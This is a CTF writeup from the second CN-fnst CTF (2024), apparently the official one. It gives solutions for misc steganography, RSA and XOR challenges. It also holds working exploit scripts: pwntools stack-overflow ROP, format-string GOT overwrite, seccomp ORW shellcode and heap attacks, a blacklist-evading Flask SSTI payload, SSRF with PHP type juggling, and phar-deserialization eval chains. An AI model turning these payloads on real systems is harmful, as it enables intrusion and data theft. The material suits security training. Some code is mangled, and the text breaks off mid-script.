---
title: 第二届CN-fnst--CTF官方writeup
contest: CN-fnst--CTF
year: 2024
difficulty: medium
vuln_type: ssti
tags:
- 公益CTF
- Misc
- Misc-crypto
- Web-SSTI
- Web-RCE
- Pwn-stack
- Heap
- Sandbox-shellcode
- RE-XOR
- Crypto-RSA
attack_chain: 钓鱼执法反作弊→key.html歌词数字提hex→silenteye音频隐写→二十八星宿四象限→玄武00青龙01白虎10朱雀11二进制解flag→Flask SSTI unicode十六进制属性名绕黑名单→canary+ret2libc栈溢出ROP→fmtstr_payload覆盖got→seccomp openat+read+write shellcode→fastbin attack free_hook→凯撒密码1位移→UPX脱壳+XOR key爆破→RSA yafu分解n→dp泄露构造φ→2331位01序列合法状态DP
key_payload: 'flag{BaguA_M4ster_0v0}|{%print g[''pop''][(''_''*2)|attr("x5fx5faddx5fx5f")(''globals'')...%}|b''a''*(0x8*3-1)+b''Z''+p(canary)+prdi+...+p(0x400737)|fmtstr_payload(8, {elf.got["exit"]: p(elf.sym["main"])})+fmtstr_payload(8, {elf.got["printf"]: p(system)})+b''/bin/sh\x00'''
one_liner: 公益赛事998人注册584队参赛,反作弊在某鱼钓鱼执法+14题覆盖Misc隐写音频四象限二进制/Flask SSTI黑名单绕/canary栈溢出ROP/格式化字符串盖got/seccomp openat shellcode/fastbin free_hook/凯撒+图片隐写/UPX脱壳+XOR爆破/RSA yafu/DP泄露/2331位状态DP
lesson: '1) Flask SSTI WAF可读源文件后用十六进制属性名x5fx5faddx5fx5f绕黑名单(''__add__''→''x5fx5faddx5fx5f''); 2) 栈溢出canary末字节必为\x00爆破1字节绕过; 3) fmtstr_payload(offset, {got: value})两步覆盖exit→main循环+printf→system; 4) seccomp禁execve时用openat+read+write纯汇编ORW; 5) tcache下fake_fast布置后backdoor地址前置; 6) RSA已知dp可直接计算p: e*dp ≡ 1 (mod p-1) → p = e*dp - 1 + k*((e*dp-1)//(k+1))... 7) 二十八星宿四象限编码本质是2bit/字符的二进制编码'
quality: high
full_path: 第二届CN-fnst--CTF官方writeup.full.md
meta_path: 第二届CN-fnst--CTF官方writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 第二届CN-fnst--CTF官方writeup。公益赛事998人注册584队参赛,反作弊在某鱼钓鱼执法+14题覆盖Misc隐写音频四象限二进制/Flask SSTI黑名单绕/canary栈溢出ROP/格式化字符串盖got/seccomp openat shellcode/fastbin free_hook/凯撒+图片隐写/UPX脱壳+XOR爆破/RSA yafu/DP泄露/2331位状态D...
category: misc
subcategory: misc_other
tools_used:
- Flask
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/219293.html
reasoning_chain:
- 赛事标注 '公益 CTF' + 998 人注册 584 队 + 反作弊钓鱼执法 → 触发点：赛事规模 + 反作弊记录
- 夜观天象题 → 触发点：key.html 歌词含数字 → 动作：提数字 → 假设：676966742069732070407373776464 是 hex
- 动作：hex 转 ascii → 观察：gift is p@sswdd → 用 p@sswdd 解音频隐写
- 动作：silenteye 解音频 → 观察：flag.txt → 得到 flag
- 二十八星宿题 → 触发点：4 象限 + 28 宿分类 → 假设：每象限 2 bit 编码
- 动作：玄武=00/青龙=01/白虎=10/朱雀=11 → 2 bit/字符 ×8 字符 = 8 bit ASCII → 观察：flag{BaguA_M4ster_0v0}
- ez_python Flask + WAF 过滤 proc → 触发点：十六进制属性名绕黑名单
- 假设：__add__ → 'x5fx5faddx5fx5f' unicode 十六进制 → 动作：构造 {%print g['pop'][('_'*2)|attr('x5fx5faddx5fx5f')]...%}
- Pwn 题栈溢出 + canary 末字节爆破 → 触发点：canary 字节 0x00 固定 → 动作：b'a'*(0x8*3-1)+b'Z'+p64(canary)+prdi+...+p64(0x400737)
- 假设：seccomp 禁 execve → 动作：openat+read+write 纯汇编 ORW shellcode
- 'fmtstr 题两步覆盖 → 动作：fmtstr_payload(8, {elf.got[''exit'']: p(elf.sym[''main''])}) + fmtstr_payload(8, {elf.got[''printf'']: p(system)})'
- RSA 已知 dp → 动作：e*dp ≡ 1 (mod p-1) → p = e*dp - 1 + k*((e*dp-1)//(k+1)) 爆破 k
failed_attempts:
- silenteye 默认密码尝试 → 失败：密码必须从 key.html 歌词中提数字 hex 解密
- Flask SSTI 直接用 __add__ → 失败：WAF 黑名单过滤 __ 类属性名
- Pwn 用 ret2libc → 失败：seccomp 禁 execve 必须 openat+read+write
key_observations:
- 公益 CTF 赛事反作弊：在某鱼平台钓鱼执法是常见赛事运营手段
- Flask SSTI WAF 绕：__attr__ → x5f__attr__x5f unicode 十六进制属性名
- seccomp 禁 execve 时 ORW（openat+read+write）纯汇编 shellcode 是必学套路
- 格式化字符串两步覆盖 got 表：先 exit→main 形成循环 + 再 printf→system
- RSA 已知 dp 可直接求 p：e*dp ≡ 1 (mod p-1) → 爆破 k
prerequisites:
- Flask SSTI 模板注入 + WAF 绕技巧
- seccomp 系统调用限制绕过（ORW shellcode）
- RSA dp 泄露攻击（已知 dp 求 p）
- 格式化字符串 got 表两步覆盖
---
# 第二届CN-fnst::
CTF官方writeup

> 原文: https://www.ctfiot.com/219293.html
> ID: 219293

免责声明

❝

由于传播、利用本公众号"隼目安全"所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号"隼目安全"及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！

首先感谢师傅们积极参与此次赛事，平台累计注册用户998人，累计创建队伍623支，实际报名参赛队伍584支

感谢阻击者联盟、黄豆安全实验室、泷羽Sec、内蒙古悠米科技有限公司、重生之成为赛博女保安、河北科技大学AfterWave网安协会在本次赛事中所做出的贡献

本次赛事比较仓促，所以有不足的地方还请师傅们海涵

在赛事进行过程中，我们发现有部分选手在某鱼等第三方平台贩卖赛题答案，本届赛事为公益赛事，我们对这种行为严厉谴责

我们也加强了对作弊等情况的监控与处理，最大程度确保公平性

同时也安排主办方等在某鱼等三方平台进行"钓鱼执法"，至于结果嘛，只能说令人忍俊不禁
钓鱼ing
钓鱼ing
钓鱼ing

可谓是收获颇丰，不愧是国产CTF一把梭小工具

夜观天象

记事本打开key.html文件，将歌词部分的数字提取出来676966742069732070407373776464。

Hex转换一下ascii

得到：gift is p@sswdd

将音频方法silenteye中，用p@sswdd作为密码

得到flag.txt

得到的二十八星宿，分出来青龙白虎朱雀玄武

玄武对应00
青龙对应01
白虎对应10
朱雀对应11

解密脚本

#解密脚本
list1 = ['斗木獬', '牛金牛', '女土蝠', '虚日鼠', '危月燕', '室火猪', '壁水貐']
list2 = ['角木蛟', '亢金龙', '氐土貉', '房日兔', '心月狐', '尾火虎', '箕水豹']
list3 = ['奎木狼', '娄金狗', '胃土雉', '昴日鸡', '毕月乌', '觜火猴', '参水猿']
list4 = ['井木犴', '鬼金羊', '柳土獐', '星日马', '张月鹿', '翼火蛇', '轸水蚓']

# 定义输入数据
data = [
    "角木蛟", "觜火猴", "箕水豹", "毕月乌", "氐土貉", "毕月乌", "轸水蚓", "女土蝠", "尾火虎", "昴日鸡", "壁水貐", "箕水豹",
    "尾火虎", "奎木狼", "心月狐", "张月鹿", "尾火虎", "井木犴", "昴日鸡", "柳土獐", "角木蛟", "女土蝠", "室火猪",
    "觜火猴", "氐土貉", "奎木狼", "牛金牛", "箕水豹", "亢金龙", "胃土雉", "房日兔", "翼火蛇", "尾火虎", "轸水蚓",
    "箕水豹", "尾火虎", "尾火虎", "壁水貐", "牛金牛", "亢金龙", "氐土貉", "箕水豹", "翼火蛇", "翼火蛇", "亢金龙",
    "女土蝠", "星日马", "角木蛟", "壁水貐", "井木犴", "角木蛟", "牛金牛", "箕水豹", "柳土獐", "室火猪", "张月鹿",
    "心月狐", "星日马", "角木蛟", "虚日鼠", "亢金龙", "参水猿", "箕水豹", "箕水豹", "尾火虎", "翼火蛇", "斗木獬",
    "参水猿", "心月狐", "尾火虎", "张月鹿", "张月鹿", "虚日鼠", "星日马", "斗木獬", "室火猪", "氐土貉", "鬼金羊",
    "角木蛟", "娄金狗", "斗木獬", "井木犴", "壁水貐", "斗木獬", "氐土貉", "星日马", "轸水蚓", "氐土貉"
]

# 存储二进制字符串
binary_string = ""

# 遍历 data 并拼接对应的二进制代码
for item in data:
    if item in list1:
        binary_string += "00"
    elif item in list2:
        binary_string += "01"
    elif item in list3:
        binary_string += "10"
    elif item in list4:
        binary_string += "11"

# 每8位二进制转换成ASCII字符并输出
ascii_output = ""
for i in range(0, len(binary_string), 8):
    byte = binary_string[i:i + 8]  # 获取8位二进制
    ascii_output += chr(int(byte, 2))  # 转换为十进制并转为字符

print(ascii_output)

得到flag：flag{BaguA_M4ster_0v0}

ez_python

开题显示如下内容：

Find the get parameter to read something

也就是说找到某个get传参的参数来读什么东西，这里直接使用arjun来进行爆破参数：

得到是file参数，然后尝试进行文件读取，成功读取文件：

然后就可以进行源码读取：

文件内容如下：

from flask import Flask, request, render_template_string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import waf

app = Flask(__name__)

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["300 per day", "75 per hour"]
)

@app.route('/')
@limiter.exempt
def index():
    file_path = request.args.get('file')
    if file_path and "proc"in file_path:
        return"只过滤了proc，别想用这个了，去读源码", 200
    if file_path:
        try:
            with open(file_path, 'r') as file:
                file_content = file.read()
            return f"{file_content}"
        
except Exception as e:
            return f"Error reading file: {e}"
    return"Find the get parameter to read something"

@app.route('/shell')
@limiter.limit("10 per minute")
def shell():
    if request.args.get('name'):
        person = request.args.get('name')
        if not waf.waf_check(person):
            mistake = "Something is banned"
            return mistake
        template = 'Hi, %s' % person
        return render_template_string(template)
    some = 'who you are?'
    return render_template_string(some)

@app.errorhandler(429)
def ratelimit_error(e):
    return"工具？ 毫无意义，去手搓", 429

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=8000)

审计源码，发现ssti漏洞点：

@app.route('/shell')
@limiter.limit("10 per minute")
def shell():
    if request.args.get('name'):
        person = request.args.get('name')
        if not waf.waf_check(person):
            mistake = "Something is banned"
            return mistake
        template = 'Hi, %s' % person
        return render_template_string(template)
    some = 'who you are?'
    return render_template_string(some)

然后有waf，发现是直接调用的waf文件的函数，所以也是可以直接读取的：

def waf_check(value):
    dangerous_patterns = ['os', 'set', '__builtins__', '=', '.', '{{', '}}', 'popen', '+', '__']
    for pattern in dangerous_patterns:
        if pattern in value:
            return False
    return True

所以就是明牌waf了，然后直接打就行了，最后可以获取到如下payload：

{%print g['pop'][('_'*2)|attr("x5fx5faddx5fx5f")('globals')|attr("x5fx5faddx5fx5f")('_'*2)][('_'*2)|attr("x5fx5faddx5fx5f")('builtins')|attr("x5fx5faddx5fx5f")('_'*2)][('_'*2)|attr("x5fx5faddx5fx5f")('import')|attr("x5fx5faddx5fx5f")('_'*2)]('so'[::-1])['p''open']('ls')['read']()%}

这里就可以进行文件读取了：

直接读flag即可：

signin

from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

prdi = 0x000000000040071E
ru(b"Enter your name: ")
sl(b"1")
ru(b"Introduce yourself: ")
payload = b"a" * (0x8 * 3 - 1) + b"Z"

sl(payload)
ru(b"Zn")
canary = u(r(7).rjust(8, b" "))
success(hex(canary))
ru(b"Say something: ")
payload = (
    b"a" * (0x8 * 3)
    + p(canary)
    + b"a" * 8
    + p(prdi)
    + p(elf.got["read"])
    + p(elf.sym["puts"])
    + p(0x000000000400737)
)

sl(payload)
leak_got = u(r(6).ljust(8, b" "))

success(hex(leak_got))
base = leak_got - 0x110020
system = base + 0x4F420
success(hex(system))
binsh = 0x000000000600CF0
payload = (
    b"a" * (0x8 * 3)
    + p(canary)
    + b"a" * 8
    + p(0x0000000000400596)
    + p(prdi)
    + p(binsh)
    + p(system)
)
ru(b"Enter your name: ")
sl(b"/bin/sh ")
ru(b"Introduce yourself: ")
sl(b"1")
ru(b"Say something: ")
sl(payload)

ia()

真·签到

sh
cat flag

ez_fmt

from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

ru(b"Gift for you: ")
read = int(r(len(str(0x7F175D9A37D0))), 16)
success(hex(read))
system = read - 0x110020 + 0x4F420
base = 8
ru(b"Enter a fmt string:")
payload = fmtstr_payload(base, {elf.got["exit"]: p(elf.sym["main"])})
sl(payload)

ru(b"Enter a fmt string:")
payload = fmtstr_payload(base, {elf.got["printf"]: p(system)})
sl(payload)
sl(b"/bin/shx00")

ia()

ez_sandbox

from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

shellcode = """
/* openat(file='/flag', oflag=0, mode=0) */
    /* push b'flagx00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c66
    xor [rsp], rax
    mov rsi, rsp
    mov rdi, -100
    mov rdx, 0
    mov r8, 0
    /* call open() */
    mov rax, 0x101
    syscall
    mov r10,rsp
    add r10,100
    mov qword ptr [rsp],r10
    mov qword ptr [rsp+8],1024
    mov rdi, rax
    mov rax, 19
    mov rsi,rsp
    mov rdi,3
    mov rdx, 1
    syscall
    mov eax, 20
    mov edi, 1
    mov rsi, rsp
    mov rdx, 1
    syscall
"""

s(asm(shellcode))
ia()

babyheap

from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

def menu():
    ru(b"Enter your choice: ")

def alloc(idx, size, content):
    menu()
    sl(b"1")
    ru(b":")
    sl(str(idx))
    ru(b":")
    sl(str(size))
    ru(b":")
    sl(content)

def free(idx):
    menu()
    sl(b"3")
    ru(b":")
    sl(str(idx))

def edit(idx, size, content):
    menu()
    sl(b"2")
    ru(b":")
    sl(str(idx))
    ru(b":")
    sl(str(size))
    if size == 0:
        return
    else:
        ru(b":")
        sl(content)

def show(idx):
    menu()
    sl(b"4")
    ru(b":")
    sl(str(idx))

ru(b"What's this?: ")
backdoor = int(r(8), 16)
alloc(0, 0x90, b"aa")
alloc(1, 0x60, b"aa")
alloc(2, 0x60, b"aa")
edit(0, 0, b"")
show(0)
ru(b"0: ")
leak = u(r(6).ljust(8, b" "))

# free_hook = leak + 0x01C30
fake_fast = leak - 0x7B
success(hex(fake_fast))
# ps()
edit(1, 0, b"")
edit(2, 0, b"")

success(hex(backdoor))
edit(1, 0x60, p(fake_fast))
alloc(3, 0x60, b"aa")
alloc(4, 0x60, b"aa")
alloc(5, 0x60, b"a" * 0x3 + p(backdoor))

menu()
sl(b"1")
ru(b":")
sl(str(6))
ru(b":")
sl(str(0x10))

ia()

babyheap_revenge

from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

def menu():
    ru(b"Enter your choice: ")

def alloc(idx, size, content):
    menu()
    sl(b"1")
    ru(b":")
    sl(str(idx))
    ru(b":")
    sl(str(size))
    ru(b":")
    s(content)

def free(idx):
    menu()
    sl(b"3")
    ru(b":")
    sl(str(idx))

def edit(idx, content):
    menu()
    sl(b"2")
    ru(b":")
    sl(str(idx))
    ru(b":")
    s(content)

def show(idx):
    menu()
    sl(b"4")
    ru(b":")
    sl(str(idx))

base = 0
for i in range(9):
    alloc(base, 0x20, b"a")
    base += 1
free(4)
free(3)
payload = b"a" * (0x90 - 1) + b"Z"
edit(0, payload)
show(0)
ru(b"Z")

heap0 = u(r(4).ljust(8, b" ")) - 0xC0
heap_base = heap0 - 0x490
success(hex(heap_base))

pause()  # 这里看运气，如果heap的地址不是4字节长就得重新运行exp，懒得修这个bug了

payload = (
    p(0) * 4 + p(0x31) + p(0xA1) + p(0) * 2 * 9 + p(0xA1) + p(0x21) + p(0x21) + p(0x11)
)
edit(0, payload)
free(1)
payload = b"a" * 8 * 5 + b"a" * 7 + b"Z"
edit(0, payload)
show(0)
ru(b"Z")
leak = u(r(6).ljust(8, b" "))
leak -= 0x3C3B78
success(hex(leak))
fake_fast = leak + 0x3C3AED
og = leak + 0xEF9F4
"""0x4525a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
0xef9f4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
0xf0897 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv"""

payload = (
    p(0) * 5 * 2 + p(0) + p(0x71) + p(0) * 2 * 6 + p(0x61) + p(0x11) + p(0x11) + p(0x11)
)
edit(0, payload)
free(2)
payload = p(0) * 5 * 2 + p(0) + p(0x71) + p(fake_fast)
edit(0, payload)
alloc(1, 0x60, b"a")
alloc(2, 0x60, b"a" * 0x13 + p(heap0 + 0x10))
payload = asm(shellcraft.sh())
edit(0, payload)
free(1)

menu()
sl(b"1")
ru(b":")
sl(str(1))
ru(b":")
sl(str(0x10))

ia()

Sign in

进去以后，是一个类似于base64的文件，但是并非。

根据提示：罗马独裁官，得出是凯撒 凯撒密码位移1

然后直接访问

另存为

根据提示，得出：这是个隐写，且需要上网找工具

图片添加文字隐藏信息-图片隐写术在线工具(https://www.toolscat.com/img/image-mask)

可以上这个网站

AmaZing_BruteForce

查壳，有upx

直接upx-d即可

然后进去看到如下代码

这个正则是key的

直接爆破即可

import itertools
import string

ciphertext = bytearray([0x08, 0x05, 0x0a, 0x02, 0x15, 0x23, 0x3e, 0x36, 0x3a, 0x36, 0x2f, 0x55, 0x31, 0x58, 0x3f, 0x18])
def xor_decrypt(data, key):
    decrypted = bytearray()
    for i in range(len(data)):
        decrypted.append(data[i] ^ key[i % len(key)])
    return decrypted
def brute_force_xor_key(ciphertext):
    for key in itertools.product(string.ascii_lowercase, repeat=4):
        key_str = ''.join(key)
        decrypted_text = xor_decrypt(ciphertext, bytes(key_str, 'utf-8'))
        print(f'key: {key_str}, | {decrypted_text.decode("utf-8")}')
    return None
found_key = brute_force_xor_key(ciphertext)

ezphp

直接md5强弱类型

ezCrypto

yafu分解n，得到pq，直接解即可

from sympy import mod_inverse
e = 65537
n = 1455925529734358105461406532259911790807347616464991065301847
p = 1201147059438530786835365194567
q = 1212112637077862917192191913841
c = 69380371057914246192606760686152233225659503366319332065009
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]).decode())

神秘dp

有dp了，直接算或者分解n

from sympy import mod_inverse
p = 105038194193899515019447140405205579493289210244572767409545440358851163280965395453074976398044017243177911159096972243867985372174027224124181767942149308681063335044762355577934881504502469182724481949671518205998572766264483054891139270362336019492873565945485673532086972823698106471372599520368545108299
q = 131875826716323523148433295878953050557752317511962437375097305678556817762514768704278183959540938622638859584695873987803639891091171158984491576191575189523381929708029006917399486577694013126044860470568409738236462778680818847784162139064455152770977552909157838301186145084657447139653926320540680063339
e = 65537
n = 13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361
dp = 100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473
c = 6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]).decode())

math

没pq，就用dp求p

from gmpy2 import next_prime
def count_valid_sequences(length):
    dp = [{} for _ in range(length + 1)]
    dp[1][1] = 1
    for i in range(1, length):
        for state in dp[i]:
            for next_bit in [0, 1]:
                new_state = ((state << 1) & 0b111) | next_bit
                if i >= 3:
                    full_seq = ((state << 1) | next_bit)
                    if full_seq == 0b1111 or full_seq == 0:
                        continue
                dp[i + 1][new_state] = dp[i + 1].get(new_state, 0) + dp[i][state]
    result = 0
    for state in dp[length]:
        if state & 1: 
            result += dp[length][state]
    return result
key = count_valid_sequences(2331)
print(key)
p = next_prime(key)
print(p)

有了p就能算flag了：

from Crypto.Util.number import *
from sympy import mod_inverse

n = 739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059
c = 229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743
e = 65537
p = 24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253644278000783263820558388701592370615088140947096898134081330591301984360290318641970617489021626752360815885812583176251873031239638493762071047588297627032203293985708994218852662838640238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616373347825119600328855885246072890798551616534636247023983959037046475229361825549780845049341719145179099452625523855259198581865855234803188298849910863377098140158406245399677912502444220011884063994451182221171275547685147549629637310805120817903
q = n // p
phi_n = (p - 1) * (q - 1)
d = mod_inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m).decode()
print(flag)

comment_me

该题目为flask框架的ssti并且过滤点

输入{{''['__class__']['__base__']['__subclasses__']()[117]['__init__']['__globals__']['popen']('ls /')['read']()}}获取根目录内容，修改其中指令ls为cat flag文件即可获得flag

iameeeeeshili

打开页面，先随便登录一个号，抓包查看，发现参数flie，不难想到文件包含，将file改成其他字符串得到提示

$files = array('./login', './modify', './register', './flag');
if (isset($_POST['file']) && in_array($_POST['file'], $files)){...}

大意为：只有'./login', './modify', './register', './flag'四个文件能被包含

尝试包含flag得到

$client_ip = $_SERVER["REMOTE_ADDR"];
$server_ip = $_SERVER["SERVER_ADDR"];
if ($client_ip === $server_ip) {
    if(md5($_GET["a"]) === md5($_GET["b"])){
        if ($_GET["c"] != $_GET["d"] && md5($_GET["c"]) == md5($_GET["d"])){
            if(substr(md5($_GET["e"]), 0, 5) === "9331c"){
                $file = fopen("./ffflllaaaggg.php", "w");
                fwrite($file, "<?php n echo $flag".";");
                fclose($file);
            }
        }
    }
} else {
    $code = '';
    highlight_string($code);
    echo'<script>alert("错啦错啦错啦！");</script>';
    header('Location: login.html');
    die();
}

代码的大意为：只有本地才能访问，并且需要完成一系列验证，这一系列验证为 md5强类型和弱类型比较、md5截断，最后flag会被放进文件 ffflllaaaggg.php里面。

关于md5截断的脚本可自行百度，网上有很多现成的

#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# @Project -> File     ：flag -> md5         
# @IDE      ：PyCharm
# @Author   ：wi1shu
# @Date     ：2023/4/17 14:52
# @Software : win10 python3.9
import hashlib
import threading

total = 100000000000
# 从1到多少
threads = 100
# 线程数
truncation = "9331c"# 被截断的值
positions = [0, 5] # 截断位置

per_thread = total // threads
threads_list = []
def calculate_md5(start, end):
    for i in range(start, end):
        md5 = hashlib.md5(str(i).encode()).hexdigest()
        if md5[positions[0]:
positions[1]] == truncation:
            print(f"{truncation} -> {i}: {md5}")

if __name__ == "__main__":
    for i in range(threads):
        start = i * per_thread + 1
        end = start + per_thread
        if i == threads - 1:
            end = total + 1
        thread = threading.Thread(target=calculate_md5, args=(start, end))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

    print("finished.")

注册一个号，登录进去之后发现可以进行检查网页，不难想到利用这里的检查网页来绕过上面的第一步校验，即只有本地才能访问，尝试利用该校验进行访问flag，发现只有饿饿饿饿饿势力可以访问

尝试修改 eeeeeshili 用户名的密码，发现没有回应，再尝试修改刚才注册的号的密码，发现有回应，抓包查看，可以发现base64编码的提示

$client_ip = $_SERVER["REMOTE_ADDR"];
$server_ip = $_SERVER["SERVER_ADDR"];
if ($client_ip === $server_ip) {
    if ($_GET["KAF"] !== "1a" && (int)$_GET["KAF"] == "1a"){
        ...
    }
} else {
    echo 'xxx'
    echo '<script>alert("坏蛋改不了一点密码！");</script>';
    die();
}

正如上文所说，利用登录进去之后的检查网页即可绕过第一步限制本地访问，再利用php弱类型的特点即可绕过，完成改密码，payloadcheck_http://127.0.0.1/check.php?file=./modify&account=eeeeeshili&password=a&KAF=1

再次登录eeeeeshili账户，发现可以访问flag了，再构建payload即可拿到flag，具体构建过程不再赘述，paloadcheck_http://127.0.0.1/check.php?file=./flag&a[]=1&b[]=2&c=QLTHNDT&d=QNKCDZO&e=2000864773

相关知识为：md5强类型比较、md5弱类型比较、md5截断、php弱类型、ssrf

只提供了大概过程!

filechecker_revenge

代码审计，是通过phar包的php反序列化，并且发现是需要绕过$this->mymd5 === $yourmd5，通过文件上传phar包，phar包修改文件头为GIF89A并修改后缀为gif上传，再设置cookiemd5me和yourname，然后通过filecheck.php利用php伪协议绕过过滤检查上传的phar包触发php反序列化php://filter/read=convert.base64-encode/resource=phar://，从而获取到md5(md5(file_get_contents('/flag'))."hacker") 的值

$file=new file();
@unlink("phar1.phar");
$phar = new Phar("phar1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

再通过哈希拓展攻击绕过$this->mymd5 === $yourmd5

然后通过data://协议绕过file_get_contents，再通过无参数读文件绕过相应的过滤即可读到flag，也需要修改phar包文件头和修改后缀，然后爆破一下即可获得flag

// 读取根目录下有什么文件
$file2=new file();
$file2->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file2->name = new file();
$file2->name->ou = new data();
$file2->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));';

@unlink("phar2.phar");
$phar = new Phar("phar2.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file2); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 随机读取根目录下的文件
$file3=new file();
$file3->data = 'data://text/plain,bbf9a96f322ee4800a910dac0f76ca05'; //修改为对应的md5值
$file3->name = new file();
$file3->name->ou = new data();
$file3->name->ou->oi = 'if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));';

@unlink("phar3.phar");
$phar = new Phar("phar3.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($file3); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

<?php

class file
{
    public $name;
    public $data;
    public $ou;
    private $mymd5;
    publicfunction __wakeup()
    {

    }
    publicfunction __call($name, $arguments)
    {
        return$this->ou->b='asdasdasd';
    }

    publicfunction __destruct()
    {
        if (@file_get_contents($this->data) === $this->mymd5) {
            $this->name->function();
        }
    }
}

class data
{
    public $a;
    public $oi;

    publicfunction __set($name, $value)
    {
        // TODO: Implement __set() method.
        $this->yyyou();
        return"yes";
    }

    publicfunction yyyou()
    {
        if(';' === preg_replace('/[^W]+((?R)?)/', '', $this->oi)){
            eval($this->oi);
        }

    }
}

$file=new file();
@unlink("phar1.phar");
$phar = new Phar("phar1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>"); //设置stub
